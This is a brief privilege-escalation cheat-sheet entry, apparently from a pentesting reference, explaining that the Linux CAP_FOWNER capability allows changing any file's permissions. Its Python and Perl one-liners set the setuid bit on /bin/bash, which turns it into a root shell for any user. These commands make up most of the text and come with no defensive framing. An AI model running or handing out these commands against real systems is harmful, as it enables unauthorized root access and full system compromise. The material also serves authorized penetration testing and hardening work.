# PrivEsc via Capabilities

### CAP\_FOWNER

This means that it's possible to change the permission of any file.

```bash
# Example with binary:
python3 -c 'import os;os.chmod("/bin/bash",0o4755)'
perl -e 'my $mode = 04755; chmod $mode, "/bin/bash";'
```
